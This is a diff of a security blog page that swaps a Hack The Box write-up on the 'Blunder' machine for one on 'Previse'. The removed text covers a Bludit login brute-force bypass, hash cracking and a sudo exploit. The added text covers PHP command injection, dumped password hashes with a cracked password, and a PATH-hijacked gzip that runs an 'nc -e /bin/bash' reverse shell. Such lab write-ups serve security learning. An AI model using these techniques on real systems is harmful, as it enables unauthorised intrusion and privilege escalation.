@@ -15,7 +15,7 @@
     
     
       
-        <title>2020 07 12 blunder - ikirt.github.io</title>
+        <title>2021 08 05 previse - ikirt.github.io</title>
       
     
     
@@ -92,7 +92,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              2020 07 12 blunder
+              2021 08 05 previse
             
           </span>
         </div>
@@ -379,19 +379,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-      
-      
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../2020-07-12-blunder/" class="md-nav__link">
         2020 07 12 blunder
       </a>
-      
     </li>
   
 
@@ -555,11 +547,19 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../2021-08-05-previse/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         2021 08 05 previse
       </a>
+      
     </li>
   
 
@@ -708,115 +708,113 @@
               
                 
 
-  <h1>2020 07 12 blunder</h1>
+  <h1>2021 08 05 previse</h1>
 
-<p><img alt="BlunderHomePage" src="/images/blunder/logo.png" style="height:377px;width:595px" /></p>
-<p>Blunder was just retired, here is my write-up on how I worked my way through this box.</p>
-<p>Basic enumeration came back with the following ports.</p>
-<p><strong>tcp/80/nmap-http - Identified HTTP Server: Apache/2.4.41 (Ubuntu)</strong></p>
-<p>Looks like the attack surface is going to be web based for this one. So I decide to kickoff a web scanning to see what's on the site.</p>
-<p>Visiting the site I see a CMS.</p>
-<p><img alt="BlunderHomePage" src="/images/blunder/blunder-homepage.png" /></p>
-<p>Poking around, there isn't much here but random information.</p>
-<p>Time to see what's hidden on the site, dirsearch came back with the following.</p>
-<div class="highlight"><pre><span></span><code><span class="m">403</span>   277B   http://10.10.10.191:80/.php
-<span class="m">403</span>   277B   http://10.10.10.191:80/.html
-<span class="m">403</span>   277B   http://10.10.10.191:80/icons/
-<span class="m">200</span>     2KB  http://10.10.10.191:80/admin/
-<span class="m">200</span>    30B   http://10.10.10.191:80/install.php
-<span class="m">200</span>    22B   http://10.10.10.191:80/robots.txt
-<span class="m">200</span>   118B   http://10.10.10.191:80/todo.txt
+<p><img alt="Previse" src="/images/previse/logo.png" style="height:377px;width:595px" /></p>
+<p>This is another Linux box rated as Easy. I will start off with NMAP.</p>
+<div class="highlight"><pre><span></span><code>Nmap 7.92 scan initiated Fri Sep 17 23:56:22 2021 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /home/triki/HTB/boxes/Previse/results/10.10.11.104/scans/_full_tcp_nmap.txt -oX /home/triki/HTB/boxes/Previse/results/10.10.11.104/scans/xml/_full_tcp_nmap.xml 10.10.11.104
+Nmap scan report for 10.10.11.104
+Host is up, received user-set (0.022s latency).
+Scanned at 2021-09-17 23:56:23 EDT for 277s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U+bBa/UyMNxMjkPO+rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB+KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q+i+gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI+k9kT2gYslacuTwQhacntIh2XFo0YtfY+dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd
+|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF+aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4=
+|   256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv+Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-title: Previse Login
+|_Requested resource was login.php
+|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
 </code></pre></div>
-<p>Checking out the todo.txt first I see:</p>
-<div class="highlight"><pre><span></span><code>-Update the CMS
--Turn off FTP - DONE
--Remove old users - DONE
--Inform fergus that the new blog needs images - PENDING
+<p>Visiting the pages available I see:</p>
+<p><img alt="Previse" src="/images/previse/previse-1.png" /></p>
+<p>Using burp I reviews the history for this site and noticed that the html was provided for accounts.php. I can see the code used to create an account.</p>
+<p><img alt="Previse" src="/images/previse/previse-2.png" /></p>
+<p>with this I was able to create own account to sign into the site.</p>
+<p><img alt="Previse" src="/images/previse/previse-3.png" />
+<img alt="Previse" src="/images/previse/previse-4.png" /></p>
+<p>There is a page called files with a backup archive I can download.</p>
+<p><img alt="Previse" src="/images/previse/previse-5.png" /></p>
+<p>extracting the archive I see a backup of the website</p>
+<p><img alt="Previse" src="/images/previse/previse-6.png" /></p>
+<p>the juicey stuff is in config.php</p>
+<p><img alt="Previse" src="/images/previse/juicy.png" /></p>
+<p>Another page points out that the site is using MySQL</p>
+<p><img alt="Previse" src="/images/previse/mysql-hint.png" /></p>
+<p>Looking back at the <strong>Files</strong> page I see I can upload something :D</p>
+<p>Inside the login.php is a hash they used, pretty sure I will need this later after I get shell and start poking through the MySQL database with the creds found earlier.
+Looking through the files I see the logs.php calls python</p>
+<p><strong>logs.php</strong>
+<div class="highlight"><pre><span></span><code>$output = exec(&quot;/usr/bin/python /opt/scripts/log_process.py {$_POST[&#39;delim&#39;]}&quot;);
 </code></pre></div>
-<p>Got my first username <strong>fergus</strong>(save that for later). Next I checked the /admin/ page on the site.</p>
-<p><img alt="BlunderHomePage" src="/images/blunder/bludit-admin-page.png" /></p>
-<p>Attempting normal word lists produced zero results.  Googling for bludit exploits, I came across this, https://rastating.github.io/bludit-brute-force-mitigation-bypass/. This page explains that Bludit uses a method to only allow 10 login attempts based on tracking the users IP address from the headers. This exploit passes random information into the X-Forwarded-For http header to trick the site into allowing MANY password attempts.</p>
-<p>Now I need a password list, a shot in the dark was to run cewl against the site to see if the password was used somewhere there.</p>
-<div class="highlight"><pre><span></span><code>cewl -w blunder-wordlist.txt -d 10 -m 1 http://10.10.10.191
+Looking at the page for this I see</p>
+<p><strong>file_logs.php</strong></p>
+<p><img alt="Previse" src="/images/previse/previse-7.png" /></p>
+<p>Here i pick which delimeter I want, looking at the code, I should be able to use <strong>;</strong> to stop the command and conitnue with another like nc to call home for a shell. To accomplish this I will use <strong>BURP</strong></p>
+<p><img alt="Previse" src="/images/previse/previse-8.png" />
+<img alt="Previse" src="/images/previse/previse-9.png" /></p>
+<p>I get shell !
+since I have root mysql creds. I'll use them</p>
+<p><img alt="Previse" src="/images/previse/previse-10.png" /></p>
+<div class="highlight"><pre><span></span><code>mysql&gt; select * from accounts \G
+select * from accounts \G
+*************************** 1. row ***************************
+        id: 1
+  username: m4lwhere
+  password: $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
+created_at: 2021-05-27 18:18:36
+*************************** 2. row ***************************
+        id: 2
+  username: triki
+  password: $1$🧂llol$79cV9c1FNnnr7LcfPFlqQ0
+created_at: 2021-09-20 02:49:53
+*************************** 3. row ***************************
+        id: 3
+  username: anand123
+  password: $1$🧂llol$zedxR3f0qDOtIQcf273bz.
+created_at: 2021-09-20 16:19:47
+*************************** 4. row ***************************
+        id: 4
+  username: admin
+  password: $1$🧂llol$79cV9c1FNnnr7LcfPFlqQ0
+created_at: 2021-09-20 17:19:59
+4 rows in set (0.00 sec)
 </code></pre></div>
-<p>Running the exploit script with the cewl password list finds a password !!</p>
-<div class="highlight"><pre><span></span><code>╭─[us-vip-7]-[10.10.14.44]-[triki@parrot]-[/opt/htb/boxes/blunder/exploits]
-╰─[☢] $ python3 ./brute.py
-[*] Trying: to
-[*] Trying: the
-[*] Trying: of
-[*] Trying: Load
-...
-[*] Trying: fictional
-[*] Trying: character
-[*] Trying: *********
+<p>Here I find a <strong>hashed</strong> password for users on the box. I'll use <strong>hashcat</strong> to find the passwords.</p>
+<p><img alt="Previse" src="/images/previse/previse-12.png" /></p>
+<p>m4lwhere:ilovecody112235!</p>
+<p>Now I can <strong>SSH</strong> into the host as <strong>m4lwhere</strong>.</p>
+<p><img alt="Previse" src="/images/previse/previse-13.png" /></p>
+<p>Running <strong>sudo -l</strong>, I see this user can run a script <strong>/opt/scripts/access_backup.sh</strong></p>
+<p>The script looks like</p>
+<p><div class="highlight"><pre><span></span><code>m4lwhere@previse:/var/backups$ cat /opt/scripts/access_backup.sh 
+#!/bin/bash
+#We always make sure to store logs, we take security SERIOUSLY here
+#I know I shouldnt run this as root but I cant figure it out programmatically on my account
+#This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time
 
-SUCCESS: Password found!
-Use fergus:********** to login.
+gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_access.gz
+gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date=&quot;yesterday&quot; +%Y%b%d)_file_access.gz
 </code></pre></div>
-<p>Testing the login shows to be successful :)</p>
-<p><img alt="BlunderHomePage" src="/images/blunder/bludit-admin-console.png" /></p>
-<p>Search Google for Bludit exploits, I found this msf module, https://www.exploit-db.com/exploits/47699</p>
-<p><img alt="BlunderHomePage" src="/images/blunder/bludit-msf-exploit-settings.png" /></p>
-<p>Running the exploit.</p>
-<p><img alt="BlunderHomePage" src="/images/blunder/bludit-exploit-run.png" /></p>
-<p>I learned something very important here as I spent a couple days using automated scripts to enumerate for me and not really finding what I needed.
-After manually enumerating the webroot I found a <strong>newer</strong> version(bludit-3.10.0a) of bludit, so I decided to poke through it. After further enumerating, I found a file called users.php in the databases folder, inside I found this.</p>
-<div class="highlight"><pre><span></span><code>www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
-cat users.php
-&lt;?php defined(&#39;BLUDIT&#39;) or die(&#39;Bludit CMS.&#39;); ?&gt;
-{
-    &quot;admin&quot;: {
-        &quot;nickname&quot;: &quot;Hugo&quot;,
-        &quot;firstName&quot;: &quot;Hugo&quot;,
-        &quot;lastName&quot;: &quot;&quot;,
-        &quot;role&quot;: &quot;User&quot;,
-        &quot;password&quot;: &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;,
-        &quot;email&quot;: &quot;&quot;,
-        &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;,
-        &quot;tokenRemember&quot;: &quot;&quot;,
-        &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;,
-        &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;,
-        &quot;twitter&quot;: &quot;&quot;,
-        &quot;facebook&quot;: &quot;&quot;,
-        &quot;instagram&quot;: &quot;&quot;,
-        &quot;codepen&quot;: &quot;&quot;,
-        &quot;linkedin&quot;: &quot;&quot;,
-        &quot;github&quot;: &quot;&quot;,
-        &quot;gitlab&quot;: &quot;&quot;}
-}
-</code></pre></div>
-<p>Taking that password to google I see it's a SHA-1 hash, going to this site I can reverse it, https://sha1.gromweb.com/?hash=faca404fd5c0a31cf1897b823c695c85cffeb98d to see the password is <strong>Password120</strong></p>
-<p>Momemt of truth, can I <strong>su</strong> to the <strong>hugo</strong> user with this password.</p>
-<div class="highlight"><pre><span></span><code>www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su - hugo
-su - hugo
-Password: Password120
-
-hugo@blunder:~$ id
-id
-uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)
-</code></pre></div>
-<p>sweet, got the user flag</p>
-<p><img alt="UserFlag" src="/images/blunder/bludit-user-flag.png" /></p>
-<p>Now, onto ROOT, ok, so after some manual enumeration, I found some pictures on the user <strong>shuan</strong>'s Pictures folder.</p>
-<p><img alt="BlunderHomePage" src="/images/blunder/Screenshot from 2019-11-28 13-17-29.png" />
-<img alt="BlunderHomePage" src="/images/blunder/Screenshot from 2019-11-28 14-02-13.png" /></p>
-<p>The first screenshot looks like some buffer overflow, so I do a google search for <strong>sudo 1.8.27 exploit</strong> and the first hit is exploitdb
-https://www.exploit-db.com/exploits/47502</p>
-<div class="highlight"><pre><span></span><code>EXPLOIT: 
-
-sudo -u#-1 /bin/bash
-</code></pre></div>
-<div class="highlight"><pre><span></span><code>hugo@blunder:~$ sudo -u#-1 /bin/bash
-sudo -u#-1 /bin/bash
-Password: Password120
-
-root@blunder:/home/hugo# id
-id
-uid=0(root) gid=1001(hugo) groups=1001(hugo)
-</code></pre></div>
-<p>AND, I got ROOT</p>
-<p><img alt="UserFlag" src="/images/blunder/bludit-root-flag.png" /></p>
+Notice how the <strong>gzip</strong> is not called with full path, so I can use path manipulation here.
+I check the current PATH settings, then check where gzip is, next I update the PATH variable and pre-pend my custom path where my gzip script will reside. Inside the /dev/shm/gzip file I put
+<code>nc -e /bin/bash &lt;my-ip&gt; &lt;port&gt;</code>
+then I make the file executable, setup a nc listener on my host and call the access_backups.sh file</p>
+<p><img alt="Previse" src="/images/previse/previse-15.png" />
+<img alt="Previse" src="/images/previse/previse-16.png" /></p>
+<p>ROOTED.</p>
 
   <hr>
 <div class="md-source-file">
@@ -841,7 +839,7 @@ uid=0(root) gid=1001(hugo) groups=1001(hugo)
     <nav class="md-footer__inner md-grid" aria-label="Footer">
       
         
-        <a href="../2020-06-16-htb-oh-my-zsh-theme/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 2020 06 16 htb oh my zsh theme" rel="prev">
+        <a href="../2021-07-20-explore/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 2021 07 20 explore" rel="prev">
           <div class="md-footer__button md-icon">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
           </div>
@@ -850,20 +848,20 @@ uid=0(root) gid=1001(hugo) groups=1001(hugo)
               <span class="md-footer__direction">
                 Previous
               </span>
-              2020 06 16 htb oh my zsh theme
+              2021 07 20 explore
             </div>
           </div>
         </a>
       
       
         
-        <a href="../2020-07-16-tabby/" class="md-footer__link md-footer__link--next" aria-label="Next: 2020 07 16 tabby" rel="next">
+        <a href="../../hackerone/2020-04-08-petshop-pro/" class="md-footer__link md-footer__link--next" aria-label="Next: PetShop Pro Write-up" rel="next">
           <div class="md-footer__title">
             <div class="md-ellipsis">
               <span class="md-footer__direction">
                 Next
               </span>
-              2020 07 16 tabby
+              PetShop Pro Write-up
             </div>
           </div>
           <div class="md-footer__button md-icon">
